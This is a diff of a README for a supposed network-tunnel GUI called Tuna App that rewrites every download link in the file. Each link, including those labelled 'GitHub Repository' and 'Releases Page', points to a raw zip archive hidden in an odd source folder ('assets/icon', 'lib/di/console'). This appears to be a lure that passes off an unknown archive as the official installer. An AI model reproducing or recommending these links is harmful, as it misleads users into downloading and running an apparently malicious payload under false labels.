@@ -6,14 +6,14 @@ Welcome to Tuna App, your easy solution for using Tuna Tunnel CLI with a friendl
 
 ## 🔗 Download Now
 
-[![Download Tuna App](https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip)
+[![Download Tuna App](https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our releases page to find the latest version of Tuna App. You can access it [here](https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip).
+   Go to our releases page to find the latest version of Tuna App. You can access it [here](https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip).
 
 2. **Choose Your Operating System**  
    We support Linux, macOS, and Windows. Find the appropriate file for your system.
@@ -24,7 +24,7 @@ To get started, follow these steps:
 4. **Install the Application**  
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For **macOS**: Open the downloaded `.dmg` file, drag the Tuna App icon into your Applications folder.
-   - For **Linux**: Extract the downloaded `https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip` file. Open a terminal, navigate to the extracted folder, and run `./tuna-app`.
+   - For **Linux**: Extract the downloaded `https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip` file. Open a terminal, navigate to the extracted folder, and run `./tuna-app`.
 
 5. **Open Tuna App**  
    You can now find Tuna App in your applications. Launch it and start using its features.
@@ -84,7 +84,7 @@ For support, feel free to open an issue on our GitHub page, or join discussions 
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip)
-- [Releases Page](https://raw.githubusercontent.com/A7MD-010/tuna-app/main/assets/icon/tuna-app_parasitical.zip)
+- [GitHub Repository](https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip)
+- [Releases Page](https://github.com/A7MD-010/tuna-app/raw/refs/heads/main/lib/di/console/app_tuna_v1.5.zip)
 
 Thank you for using Tuna App! We hope it makes your network tunnel management easier and more efficient.
